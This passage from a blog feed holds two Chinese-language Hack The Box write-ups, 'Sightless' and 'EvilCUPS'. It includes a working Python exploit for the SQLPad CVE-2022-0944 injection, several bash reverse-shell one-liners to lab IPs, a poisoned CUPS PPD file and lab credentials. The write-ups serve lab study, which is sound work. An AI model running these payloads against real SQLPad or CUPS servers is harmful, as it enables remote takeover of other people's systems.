· 0xRoqeeb&#x2F;sqlpad-rce-exploit-CVE-2022-0944</a></p></blockquote><pre><code>import argparseimport requestsdef main():       parser = argparse.ArgumentParser(description=&quot;CVE-2022-0944 RCE Exploit&quot;)    parser.add_argument(&#39;root_url&#39;, help=&quot;Root URL of the SQLPad application&quot;)    parser.add_argument(&#39;attacker_ip&#39;, help=&quot;attacker ip&quot;)    parser.add_argument(&#39;attacker_port&#39;, help=&quot;attacker port&quot;)        args = parser.parse_args()    target_url = f&quot;&#123;args.root_url&#125;/api/test-connection&quot;    payload = f&quot;&#123;&#123;&#123;&#123; process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/&#123;args.attacker_ip&#125;/&#123;args.attacker_port&#125; 0>&1\"') &#125;&#125;&#125;&#125;&quot;    headers = &#123;        &#39;Content-Type&#39;: &#39;application/json&#39;,        &#39;Accept&#39;: &#39;application/json&#39;    &#125;    #POST data (JSON body of the request)    data = &#123;        &quot;name&quot;: &quot;test&quot;,        &quot;driver&quot;: &quot;mysql&quot;,        &quot;data&quot;: &#123;            &quot;database&quot;: payload        &#125;,        &quot;database&quot;: payload    &#125;    try:        response = requests.post(target_url, headers=headers, json=data)               print(f&quot;Response status code: &#123;response.status_code&#125;&quot;)        print(f&quot;Response body: &#123;response.text&#125;&quot;)        if response.status_code == 200:            print(f&quot;Exploit sent successfully. Check your listener on &#123;args.attacker_ip&#125;:&#123;args.attacker_port&#125;&quot;)        else:            print(f&quot;Exploit sent, but server responded with status code: &#123;response.status_code&#125;. Check your listener.&quot;)    except Exception as e:        print(f&quot;Error: &#123;e&#125;&quot;)if __name__ == &quot;__main__&quot;:    main()</code></pre><blockquote><p>根据代码来看是在创建数据库连接的时候有一个RCE。wp中给的这个网址蛮有意思的：</p><p><a href="https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fbhttps://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb">https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fbhttps://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb</a></p><p>有很多外网的博客文章，看起来很不错</p></blockquote><p>payload : database</p><pre><code>&#123;&#123;process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/10.10.16.6/9001 0>&1\"') &#125;&#125;</code></pre><p>如果只填database，会显示连接被拒绝,修改连接的数据库地址为127.0.0.1也显示被拒绝，填本机vpn的ip显示连接失败？这里我们选择换一种反弹方式，通过上传脚本来反弹：</p><p>reverse.sh:</p><pre><code class="bash">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.6/9001 0&gt;&amp;1&quot;</code></pre><p>不知道为啥，通过下载脚本再运行的脚本这招走不通，只好直接运行脚本成功反弹shell。</p><p>很奇怪没有flag，看了下wp是因为在容器里。wp尝试去爆破<code>shadow</code>文件的密码</p><p>得到<code>michael:insaneclownposse</code></p><p>后面的也不懂，先照着wp学习：</p><p><a href="https://blog.csdn.net/crisschan/article/details/79970813">设置 Chrome 远程调试端口_–remote-debugging-port&#x3D;9222-CSDN博客</a></p><p>[谷歌浏览器远程调试功能 - Rannie&#96; - 博客园](<a href="https://www.cnblogs.com/kai-/p/15701042.html">https://www.cnblogs.com/kai-/p/15701042.html</a>)</p><p>ps -aux看到谷歌开启了远程端口调试</p><p><code>ss</code> 是 <code>netstat</code> 的替代工具，速度更快，功能更强大。使用以下命令查看监听端口：</p><pre><code>ss -tuln或者netstat -tuln</code></pre><p>看见开启了8080</p><pre><code>michael@sightless:~$ netstat -tulnActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address           Foreign Address         State      tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     tcp        0      0 127.0.0.1:42075         0.0.0.0:*               LISTEN     tcp        0      0 127.0.0.1:35863         0.0.0.0:*               LISTEN     tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     tcp        0      0 127.0.0.1:32805         0.0.0.0:*               LISTEN     tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN     tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     tcp6       0      0 :::22                   :::*                    LISTEN     tcp6       0      0 :::21                   :::*                    LISTEN     udp        0      0 127.0.0.53:53           0.0.0.0:*                          udp        0      0 0.0.0.0:68              0.0.0.0:*       </code></pre><p>这里可以使用ssh的端口转发：</p><pre><code>ssh -L 8080:127.0.0.1:8080 michael@10.10.11.32</code></pre><p>然后：<a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/">Chrome Remote Debugger 渗透测试 |漏洞利用说明</a></p><p>这里设置的–remote-debugging-port&#x3D;0，代表使用随机高端口,查看进程所使用的端口：</p><blockquote><h3 id="1-使用-lsof"><a href="#1-使用-lsof" class="headerlink" title="1. 使用 lsof"></a>1. 使用 <code>lsof</code></h3><p><code>lsof</code>（List Open Files）是一个非常有用的工具，可以列出所有打开的文件及其关联的进程。要查看某个进程占用的端口，使用以下命令：</p><pre><code>bash复制代码lsof -i -P -n | grep &lt;进程名或PID&gt;</code></pre><p>将 <code>&lt;进程名或PID&gt;</code> 替换为你要检查的进程名称或进程 ID。例如：</p><pre><code>bash复制代码lsof -i -P -n | grep 1234</code></pre><h3 id="2-使用-netstat"><a href="#2-使用-netstat" class="headerlink" title="2. 使用 netstat"></a>2. 使用 <code>netstat</code></h3><p>可以通过 <code>netstat</code> 命令查看端口与进程之间的映射关系：</p><pre><code>bash复制代码netstat -tulnp | grep &lt;进程名或PID&gt;</code></pre><ul><li><code>-p</code>: 显示进程标识符和程序名称。</li><li><code>-n</code>: 以数字形式显示地址和端口号。</li></ul><h3 id="3-使用-ss"><a href="#3-使用-ss" class="headerlink" title="3. 使用 ss"></a>3. 使用 <code>ss</code></h3><p><code>ss</code> 是 <code>netstat</code> 的替代工具，可以更快地显示 socket 连接信息：</p><pre><code>bash复制代码ss -tulnp | grep &lt;进程名或PID&gt;</code></pre><h3 id="4-使用-fuser"><a href="#4-使用-fuser" class="headerlink" title="4. 使用 fuser"></a>4. 使用 <code>fuser</code></h3><p><code>fuser</code> 命令可以用来查找占用特定端口的进程：</p><pre><code>bash复制代码fuser &lt;端口号&gt;/tcp</code></pre><p>例如：</p><pre><code>bash复制代码fuser 80/tcp</code></pre><h3 id="5-使用-pidof-和-netstat"><a href="#5-使用-pidof-和-netstat" class="headerlink" title="5. 使用 pidof 和 netstat"></a>5. 使用 <code>pidof</code> 和 <code>netstat</code></h3><p>如果你只知道进程名称，可以先找到它的 PID：</p><pre><code>bash复制代码pidof &lt;进程名&gt;</code></pre><p>然后使用 <code>netstat</code> 或 <code>ss</code> 查看该进程占用的端口：</p><pre><code>bash复制代码netstat -tulnp | grep &lt;PID&gt;</code></pre><p>或</p><pre><code>bash复制代码ss -tulnp | grep &lt;PID&gt;</code></pre><p>通过这些方法，你可以找到某个进程占用的端口。</p></blockquote><p>很奇怪，查不出来</p><hr><p>&#x3D;&#x3D;这道题后面要利用谷歌浏览器漏洞的漏洞，但kali一直安装不上。由于培训期间不太方便调各种配置以及各种原因考量先暂时不打这个靶机了。&#x3D;&#x3D;</p><p>粘贴wp：</p><p>首先，在 Michael 的计算机上运行以列出所有活动的网络连接和侦听端口。识别所有打开的端口并转发除只有两位数的端口之外的所有端口。<code>netstat -tnlp</code></p><p>使用以下 SSH 命令为每个已识别的端口设置端口转发：</p><pre><code>ssh -L 42253:127.0.0.1:42253 michael@10.110.192.10</code></pre><p>将所有相关端口添加到命令中。</p><p>接下来，打开 Google Chrome 并导航到 。单击“配置”并将每个端口添加为 ，重复此步骤，直到出现连接。看到连接弹出窗口后，单击“检查”以打开一个新窗口。<code>chrome://inspect/#devices``127.0.0.1:&lt;port_number&gt;</code></p><p>在这个新窗口中，切换到“网络”选项卡并等待 Michael 登录。监控流量并找到以查找访问登录门户所需的凭据。使用这些凭证登录。<code>index.php``127.0.0.1:8080</code></p><pre><code>admin:ForlorfroxAdmin</code></pre><p>登录后，导航到“PHP”部分，然后转到“PHP-FPM 版本”并创建一个新版本。在 PHP-FPM restart command 字段中，输入以下命令：</p><pre><code>cp /root/root.txt /tmp/root.txt</code></pre><p>保存配置，然后转到 。禁用 PHP-FPM 并保存更改，然后重新启用它并再次保存。这将触发 copy 命令的执行。<code>http://127.0.0.1:8080/admin_settings.php?start=phpfpm</code></p><p>验证文件是否已复制到 。<code>root.txt``/tmp</code></p><p>要继续，请重复相同的过程，但将命令替换为：</p><pre><code>chmod 644 /tmp/root.txt</code></pre><p>最后，读入文件的内容以获取必要的信息。<code>root.txt``/tmp</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;nmap&quot;&gt;&lt;a href=&quot;#nmap&quot; class=&quot;headerlink&quot; title=&quot;nmap&quot;&gt;&lt;/a&gt;nmap&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;nmap 10.10.11.32 -sCV -p 21,22,80
Starting Nmap 7.94SV</summary>
      
    
    
    
    
    <category term="HTB" scheme="https://taninluv.github.io/tags/HTB/"/>
    
    <category term="Chrome Remote Debugger" scheme="https://taninluv.github.io/tags/Chrome-Remote-Debugger/"/>
    
    <category term="sqlpad" scheme="https://taninluv.github.io/tags/sqlpad/"/>
    
  </entry>
  
  <entry>
    <title>HTB_EvilCUPS</title>
    <link href="https://taninluv.github.io/2024/10/26/HTB-EvilCUPS/"/>
    <id>https://taninluv.github.io/2024/10/26/HTB-EvilCUPS/</id>
    <published>2024-10-26T06:16:05.000Z</published>
    <updated>2024-10-26T08:30:15.995Z</updated>
    
    <content type="html"><![CDATA[<p>参照：<a href="https://0xdf.gitlab.io/2024/10/02/htb-evilcups.html">HTB: EvilCUPS | 0xdf hacks stuff</a></p><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><pre><code class="bash">└─# nmap  10.10.11.40 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-26 02:27 EDTNmap scan report for 10.10.11.40Host is up (0.14s latency).Not shown: 998 closed tcp ports (reset)PORT    STATE SERVICE22/tcp  open  ssh631/tcp open  ippNmap done: 1 IP address (1 host up) scanned in 2.20 seconds                                                                                                                                ┌──(root㉿kali)-[~]└─# nmap -sV -sC -p 22,631 10.10.11.40Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-26 02:28 EDTNmap scan report for 10.10.11.40Host is up (0.15s latency).PORT    STATE SERVICE VERSION22/tcp  open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)| ssh-hostkey: |   256 36:49:95:03:8d:b4:4c:6e:a9:25:92:af:3c:9e:06:66 (ECDSA)|_  256 9f:a4:a9:39:11:20:e0:96:ee:c4:9a:69:28:95:0c:60 (ED25519)631/tcp open  ipp     CUPS 2.4| http-robots.txt: 1 disallowed entry |_/|_http-title: Home - CUPS 2.4.2Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 82.38 seconds</code></pre><p>简单了解一下631端口的CUPS：</p><p><a href="https://www.right.com.cn/forum/thread-8276397-1-1.html">关于使用CUPS共享打印机的正确姿势，你可以永远告别打印驱动了-OPENWRT专版-恩山无线论坛</a></p><blockquote><p><strong>GPT:</strong></p><p>CUPS（Common Unix Printing System）是一个开放源代码的打印系统，主要用于类 Unix 操作系统（如 Linux 和 macOS）。它提供了一个标准的打印服务，使得各种打印机能够通过网络共享和管理。CUPS 采用了客户端-服务器架构，并通过 Internet Printing Protocol (IPP) 进行打印任务的管理。</p><h3 id="CUPS-的主要特点"><a href="#CUPS-的主要特点" class="headerlink" title="CUPS 的主要特点"></a>CUPS 的主要特点</h3><ol><li><strong>跨平台支持</strong>：CUPS 可以在多种操作系统上运行，包括 Linux、macOS、BSD 和 Solaris。</li><li><strong>网络打印</strong>：支持通过网络打印，允许多个客户端连接到打印服务器并共享打印机。</li><li><strong>易于管理</strong>：提供一个 Web 界面（通常在 <code>http://localhost:631</code> 上可访问），使得用户可以方便地配置打印机、管理打印任务和查看打印状态。</li><li><strong>支持多种打印机</strong>：兼容多种类型的打印机，包括本地连接的和网络打印机。</li><li><strong>驱动程序支持</strong>：CUPS 支持多种打印机驱动程序，可以通过 PPD（PostScript Printer Description）文件来管理打印机。</li></ol></blockquote><h1 id="UDP端口"><a href="#UDP端口" class="headerlink" title="UDP端口"></a>UDP端口</h1><p>根据博文，</p><blockquote><p>根据 <a href="https://packages.debian.org/search?keywords=openssh-server">OpenSSH 版本</a>，主机可能正在运行 Debian 12 bookworm。</p><p>看到 CUPS（通用 Unix 打印系统），我也会检查 UDP，它很可能是打开的：</p></blockquote><p>&#x3D;&#x3D;&gt;</p><pre><code class="bash">└─# nmap -sU -p 631 10.10.11.40Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-26 02:36 EDTNmap scan report for 10.10.11.40Host is up (0.14s latency).PORT    STATE         SERVICE631/udp open|filtered ippNmap done: 1 IP address (1 host up) scanned in 1.81 seconds</code></pre><h1 id="CUPS版本"><a href="#CUPS版本" class="headerlink" title="CUPS版本"></a>CUPS版本</h1><p>nmap扫到版本是2.4，提交之后发现不对，访问一下CUPS服务器，发现还有更细微的版本划分：2.4.2</p><blockquote><p>OpenPrinting CUPS 2.4.2</p></blockquote><h1 id="查询漏洞"><a href="#查询漏洞" class="headerlink" title="查询漏洞"></a>查询漏洞</h1><table><thead><tr><th><strong>漏洞编号</strong></th><th><strong>危害描述</strong></th><th><strong>CVSS 3.1****分数</strong></th></tr></thead><tbody><tr><td>CVE-2024-47175</td><td>libppd库中存在输入验证不当漏洞，未经验证的IPP 数据可能被写入临时PPD 文件，导致攻击者注入恶意数据。</td><td><strong>8.6</strong></td></tr><tr><td>CVE-2024-47076</td><td>libcupsfilters库中存在输入验证不当漏洞，攻击者可以发送恶意数据至CUPS 系统</td><td><strong>8.6</strong></td></tr><tr><td>CVE-2024-47177</td><td>cups-filters库中存在命令注入漏洞，攻击者可以通过FoomaticRIPCommandLine PPD参数执行任意命令</td><td><strong>9.1</strong></td></tr></tbody></table><p>根据<a href="https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/">通过 CUPS 攻击 UNIX 系统，第 I 部分</a>：</p><ul><li>CVE-2024-47176 漏洞 |<strong>cups-browsed</strong> &lt;&#x3D; 2.0.1 在 UDP INADDR_ANY：631 上绑定，<code>Get-Printer-Attributes</code>信任来自任何来源的任何数据包，以触发对攻击者控制的 URL 的 IPP 请求。</li><li>CVE-2024-47076 漏洞 |<strong>libcups过滤器</strong> &lt;&#x3D; 2.1b1 <code>cfGetPrinterAttributes5</code>不会验证或清理从 IPP 服务器返回的 IPP 属性，从而向 CUPS 系统的其余部分提供攻击者控制的数据。</li><li>CVE-2024-47175 漏洞 |<strong>libppd</strong> &lt;&#x3D; 2.1b1 <code>ppdCreatePPDFromIPP2</code>在将 IPP 属性写入临时 PPD 文件时不验证或清理 IPP 属性，从而允许在生成的 PPD 中注入攻击者控制的数据。</li><li>CVE-2024-47177 漏洞 |<strong>cups-filters</strong> &lt;&#x3D; 2.0.1 <code>foomatic-rip``FoomaticRIPCommandLine</code>允许通过 PPD 参数执行任意命令。</li></ul><p>使用脚本：<a href="https://github.com/ippsec/evil-cups">IppSec&#x2F;evil-cups</a></p><pre><code>──(myenv)─(root㉿kali)-[~/work/HTB/EvilCUPS/evil-cups]└─# python3 evilcups.py 10.10.16.2 10.10.11.40 &#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.2/443 0&gt;&amp;1&quot;&#39;</code></pre><p>本地起一个443端口监听，然后点击脚本上传的打印任务，选择打印测试页即可反弹一个 shell</p><blockquote><p><code>script /dev/null -c bash</code> 是一个命令，用于启动一个新的 Bash shell，但不将输出记录到文件中。这条命令的各部分含义如下：</p><ul><li>**<code>script</code>**：这是一个用于记录终端会话的命令。它可以将所有在终端中输入的内容和输出记录到一个文件中。</li><li>**<code>/dev/null</code>**：这是一个特殊的设备文件，任何写入到这个文件的数据都会被丢弃。将输出重定向到 <code>/dev/null</code> 意味着不会保存输出。</li><li>**<code>-c</code>**：这是 <code>script</code> 命令的一个选项，后面跟着要执行的命令。在这种情况下，命令是 <code>bash</code>。</li><li>**<code>bash</code>**：这是要启动的命令行解释器。</li></ul><h3 id="整体作用"><a href="#整体作用" class="headerlink" title="整体作用"></a>整体作用</h3><p>使用 <code>script /dev/null -c bash</code> 命令可以启动一个新的 Bash shell，且不记录该会话的任何输出。这在需要临时使用 Bash shell，但又不想生成任何记录文件的情况下非常有用。</p></blockquote><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>查看可用用户</p><pre><code> cat /etc/passwd | grep &quot;sh$&quot;</code></pre><p>根据<a href="https://www.cups.org/doc/spec-design.html">CUPS 设计说明</a>:</p><blockquote><h4 id="作业文件"><a href="#作业文件" class="headerlink" title="作业文件"></a>作业文件</h4><p>调度程序将作业文件存储在 <em>spool 目录中</em>，通常为<code>/var/spool/cups</code> 。在假脱机目录中可以找到两种类型的文件：以字母 “c” 开头的<em>控制文件</em> （“c00001”， “c99999”， “c100000” 等） 和以字母 “d” 开头<em>的数据文件</em> （“d00001-001”、“d99999-001”、“d100000-001” 等）控制文件是基于原始 IPP 打印作业或创建作业消息的 IPP 消息，而数据文件是提交进行打印的原始打印文件。系统已知的每个作业都有一个控制文件，每个作业有 0 个或多个数据文件。</p></blockquote><p>以及：</p><blockquote><p>GPT:</p><p>如果你不是文件夹的所有者，且文件夹的权限设置为禁止其他用户列出内容（如 <code>r-x</code>），你将无法使用 <code>ls</code> 命令查看其内容，但仍可以访问特定的文件（如果你知道它们的路径并且有权限）。</p></blockquote><p>这里无法直接ls出<code>/var/spool/cups</code>下的作业文件，但是根据作业文件的命名规则，尝试猜测数据文件名，在这个服务器上只打印了一个文件，此时猜测他的数据文件名为<code>d00001-001</code>,直接cat果然可以，把文件内容复制下来到本地，如何使用呢？</p><h2 id="ps2pdf"><a href="#ps2pdf" class="headerlink" title="ps2pdf"></a>ps2pdf</h2><blockquote><p>GPT:</p><p><code>ps2pdf</code> 是一个命令行工具，用于将 PostScript 文件转换为 PDF 文件。它是 Ghostscript 工具集的一部分，通常用于处理和转换图形文件。</p><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><p>基本的命令格式如下：</p><pre><code>bash复制代码ps2pdf input.ps output.pdf</code></pre><ul><li>**<code>input.ps</code>**：要转换的 PostScript 文件。</li><li>**<code>output.pdf</code>**：转换后生成的 PDF 文件。</li></ul><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>如果你有一个名为 <code>document.ps</code> 的 PostScript 文件，并希望将其转换为 <code>document.pdf</code>，你可以运行以下命令：</p><pre><code>bash复制代码ps2pdf document.ps document.pdf</code></pre><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><p><code>ps2pdf</code> 提供了一些可选参数，可以在转换时调整输出 PDF 的质量和其他设置。例如：</p><ul><li>**<code>-dPDFSETTINGS=</code>**：设置 PDF 输出的质量，例如 <code>screen</code>、<code>ebook</code>、<code>printer</code>、<code>prepress</code> 等。</li><li>**<code>-dCompatibilityLevel=</code>**：设置生成 PDF 的版本。</li></ul><p>示例：</p><pre><code>bash复制代码ps2pdf -dPDFSETTINGS=/ebook input.ps output.pdf</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>ps2pdf</code> 是一个非常有用的工具，可以轻松地将 PostScript 文件转换为 PDF 文件，适用于需要将打印文件格式转换为可分发和可阅读格式的情况</p></blockquote><p>这里可以用这个工具把数据转换为pdf，打开可以看到：</p><blockquote><p>pass.txt Sat Sep 28 09:30:10 2024   1 </p><p>Br3@k-G!@ss-r00t-evilcups</p></blockquote><p>这里就得到了管理员密码</p><h1 id="维持"><a href="#维持" class="headerlink" title="维持"></a>维持</h1><p>后部分博文还看不懂，抄一个在这里：</p><p>当我以这种方式创建打印机时，它会通过 IPP 访问给定的 URL。生成的属性将另存为文件，该文件位于 以打印机名称命名：<code>cups-browsed``.ppd``/etc/cups/ppd</code></p><pre><code>root@evilcups:/etc/cups/ppd# lsHACKED_10_10_14_6.ppdroot@evilcups:/etc/cups/ppd# cat HACKED_10_10_14_6.ppd*PPD-Adobe: &quot;4.3&quot;*APRemoteQueueID: &quot;&quot;*FormatVersion: &quot;4.3&quot;*FileVersion: &quot;1.28.17&quot;*LanguageVersion: English*LanguageEncoding: ISOLatin1*PSVersion: &quot;(3010.000) 0&quot;*LanguageLevel: &quot;3&quot;*FileSystem: False*PCFileName: &quot;drvless.ppd&quot;*Manufacturer: &quot;HP&quot;*ModelName: &quot;HP 0.00&quot;*Product: &quot;(HP 0.00)&quot;*NickName: &quot;HP 0.00, driverless, cups-filters 1.28.17&quot;*ShortNickName: &quot;HP 0.00&quot;*DefaultOutputOrder: Normal*ColorDevice: True*cupsVersion: 2.4*cupsSNMPSupplies: False*cupsLanguages: &quot;en&quot;*APSupplies: &quot;&quot;*FoomaticRIPCommandLine: &quot;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1&quot;&quot;*cupsFilter2 : &quot;application/pdf application/vnd.cups-postscript 0 foomatic-rip&quot;*cupsFilter2: &quot;application/vnd.cups-pdf application/pdf 200 -&quot;*% Printer did not supply page size info via IPP, using defaults*OpenUI *PageSize/Media Size: PickOne*OrderDependency: 10 AnySetup *PageSize*DefaultPageSize: Letter*PageSize Letter/US Letter: &quot;&lt;&lt;/PageSize[612 792]&gt;&gt;setpagedevice&quot;*PageSize Legal/US Legal: &quot;&lt;&lt;/PageSize[612 1008]&gt;&gt;setpagedevice&quot;*PageSize Executive/Executive: &quot;&lt;&lt;/PageSize[522 756]&gt;&gt;setpagedevice&quot;*PageSize Tabloid/Tabloid: &quot;&lt;&lt;/PageSize[792 1224]&gt;&gt;setpagedevice&quot;*PageSize A3/A3: &quot;&lt;&lt;/PageSize[842 1191]&gt;&gt;setpagedevice&quot;*PageSize A4/A4: &quot;&lt;&lt;/PageSize[595 842]&gt;&gt;setpagedevice&quot;*PageSize A5/A5: &quot;&lt;&lt;/PageSize[420 595]&gt;&gt;setpagedevice&quot;*PageSize B5/JIS B5: &quot;&lt;&lt;/PageSize[516 729]&gt;&gt;setpagedevice&quot;*PageSize EnvISOB5/Envelope B5: &quot;&lt;&lt;/PageSize[499 709]&gt;&gt;setpagedevice&quot;*PageSize Env10/Envelope #10 : &quot;&lt;&lt;/PageSize[297 684]&gt;&gt;setpagedevice&quot;*PageSize EnvC5/Envelope C5: &quot;&lt;&lt;/PageSize[459 649]&gt;&gt;setpagedevice&quot;*PageSize EnvDL/Envelope DL: &quot;&lt;&lt;/PageSize[312 624]&gt;&gt;setpagedevice&quot;*PageSize EnvMonarch/Envelope Monarch: &quot;&lt;&lt;/PageSize[279 540]&gt;&gt;setpagedevice&quot;*CloseUI: *PageSize*OpenUI *PageRegion/Media Size: PickOne*OrderDependency: 10 AnySetup *PageRegion*DefaultPageRegion: Letter*PageRegion Letter/US Letter: &quot;&lt;&lt;/PageSize[612 792]&gt;&gt;setpagedevice&quot;*PageRegion Legal/US Legal: &quot;&lt;&lt;/PageSize[612 1008]&gt;&gt;setpagedevice&quot;*PageRegion Executive/Executive: &quot;&lt;&lt;/PageSize[522 756]&gt;&gt;setpagedevice&quot;*PageRegion Tabloid/Tabloid: &quot;&lt;&lt;/PageSize[792 1224]&gt;&gt;setpagedevice&quot;*PageRegion A3/A3: &quot;&lt;&lt;/PageSize[842 1191]&gt;&gt;setpagedevice&quot;*PageRegion A4/A4: &quot;&lt;&lt;/PageSize[595 842]&gt;&gt;setpagedevice&quot;*PageRegion A5/A5: &quot;&lt;&lt;/PageSize[420 595]&gt;&gt;setpagedevice&quot;*PageRegion B5/JIS B5: &quot;&lt;&lt;/PageSize[516 729]&gt;&gt;setpagedevice&quot;*PageRegion EnvISOB5/Envelope B5: &quot;&lt;&lt;/PageSize[499 709]&gt;&gt;setpagedevice&quot;*PageRegion Env10/Envelope #10 : &quot;&lt;&lt;/PageSize[297 684]&gt;&gt;setpagedevice&quot;*PageRegion EnvC5/Envelope C5: &quot;&lt;&lt;/PageSize[459 649]&gt;&gt;setpagedevice&quot;*PageRegion EnvDL/Envelope DL: &quot;&lt;&lt;/PageSize[312 624]&gt;&gt;setpagedevice&quot;*PageRegion EnvMonarch/Envelope Monarch: &quot;&lt;&lt;/PageSize[279 540]&gt;&gt;setpagedevice&quot;*CloseUI: *PageSize*DefaultImageableArea: Letter*ImageableArea Letter/US Letter: &quot;18 12 594 780&quot;*ImageableArea Legal/US Legal: &quot;18 12 594 996&quot;*ImageableArea Executive/Executive: &quot;18 12 504 744&quot;*ImageableArea Tabloid/Tabloid: &quot;18 12 774 1212&quot;*ImageableArea A3/A3: &quot;18 12 824 1179&quot;*ImageableArea A4/A4: &quot;18 12 577 830&quot;*ImageableArea A5/A5: &quot;18 12 402 583&quot;*ImageableArea B5/JIS B5: &quot;18 12 498 717&quot;*ImageableArea EnvISOB5/Envelope B5: &quot;18 12 481 697&quot;*ImageableArea Env10/Envelope #10 : &quot;18 12 279 672&quot;*ImageableArea EnvC5/Envelope C5: &quot;18 12 441 637&quot;*ImageableArea EnvDL/Envelope DL: &quot;18 12 294 612&quot;*ImageableArea EnvMonarch/Envelope Monarch: &quot;18 12 261 528&quot;*DefaultPaperDimension: Letter*PaperDimension Letter/US Letter: &quot;612 792&quot;*PaperDimension Legal/US Legal: &quot;612 1008&quot;*PaperDimension Executive/Executive: &quot;522 756&quot;*PaperDimension Tabloid/Tabloid: &quot;792 1224&quot;*PaperDimension A3/A3: &quot;842 1191&quot;*PaperDimension A4/A4: &quot;595 842&quot;*PaperDimension A5/A5: &quot;420 595&quot;*PaperDimension B5/JIS B5: &quot;516 729&quot;*PaperDimension EnvISOB5/Envelope B5: &quot;499 709&quot;*PaperDimension Env10/Envelope #10 : &quot;297 684&quot;*PaperDimension EnvC5/Envelope C5: &quot;459 649&quot;*PaperDimension EnvDL/Envelope DL: &quot;312 624&quot;*PaperDimension EnvMonarch/Envelope Monarch: &quot;279 540&quot;*OpenUI *ColorModel/Print Color Mode: PickOne*OrderDependency: 10 AnySetup *ColorModel*DefaultColorModel: Gray*ColorModel FastGray/Fast Grayscale: &quot;&lt;&lt;/cupsColorSpace 3/cupsBitsPerColor 1/cupsColorOrder 0/cupsCompression 0/ProcessColorModel /DeviceGray&gt;&gt;setpagedevice&quot;*ColorModel Gray/Grayscale: &quot;&lt;&lt;/cupsColorSpace 18/cupsBitsPerColor 8/cupsColorOrder 0/cupsCompression 0/ProcessColorModel /DeviceGray&gt;&gt;setpagedevice&quot;*ColorModel RGB/Color: &quot;&lt;&lt;/cupsColorSpace 19/cupsBitsPerColor 8/cupsColorOrder 0/cupsCompression 0/ProcessColorModel /DeviceRGB&gt;&gt;setpagedevice&quot;*CloseUI: *ColorModel*OpenUI *Duplex/2-Sided Printing: PickOne*OrderDependency: 10 AnySetup *Duplex*DefaultDuplex: None*Duplex None/Off: &quot;&lt;&lt;/Duplex false&gt;&gt;setpagedevice&quot;*Duplex DuplexNoTumble/On (Portrait): &quot;&lt;&lt;/Duplex true/Tumble false&gt;&gt;setpagedevice&quot;*Duplex DuplexTumble/On (Landscape): &quot;&lt;&lt;/Duplex true/Tumble true&gt;&gt;setpagedevice&quot;*CloseUI: *Duplex*DefaultResolution: 300dpi*cupsFilter2: &quot;application/vnd.cups-pdf application/pdf 0 -&quot;</code></pre><p>重要的一行是：</p><pre><code>*FoomaticRIPCommandLine: &quot;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1&quot;&quot;</code></pre><p>当它打印时，它将运行我的反向 shell。</p><p>在它的正上方，有一个空参数：</p><pre><code>*APSupplies: &quot;&quot;*FoomaticRIPCommandLine: &quot;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1&quot;&quot;</code></pre><p>这可能是来自我<a href="https://0xdf.gitlab.io/2024/10/02/htb-evilcups.html#poc-analysis">上面</a>提到的换行符注入：</p><pre><code>                SectionEnum.printer,                b&#39;printer-more-info&#39;,                TagEnum.uri            ): [f&#39;&quot;\n*FoomaticRIPCommandLine: &quot;&#123;self.command&#125;&quot;\n*cupsFilter2 : &quot;application/pdf application/vnd.cups-postscript 0 foomatic-rip&#39;.encode()],printer-more-info`必须转换为文件中的属性，然后新行开始 .`APSupplies``.ppd``FoomaticRIPCommandLine</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参照：&lt;a href=&quot;https://0xdf.gitlab.io/2024/10/02/htb-evilcups.html&quot;&gt;HTB: EvilCUPS | 0xdf hacks stuff&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;端口扫描&quot;&gt;&lt;a href=&quot;#端口扫描&quot; c</summary>
      
    
    
    
    
    <category term="HTB" scheme="https://taninluv.github.io/tags/HTB/"/>
    
    <category term="Printer" scheme="https://taninluv.github.io/tags/Printer/"/>
    
    <category term="CVE-2024-47176" scheme="https://taninluv.github.io/tags/CVE-2024-47176/"/>
    
  </entry>
  
  <entry>
    <title>XCTF_email</title>
    <link href="https://taninluv.github.io/2024/09/25/XCTF-email/"/>
    <id>https://taninluv.github.io/2024/09/25/XCTF-email/</id>
    <published>2024-09-25T08:34:39.000Z</published>
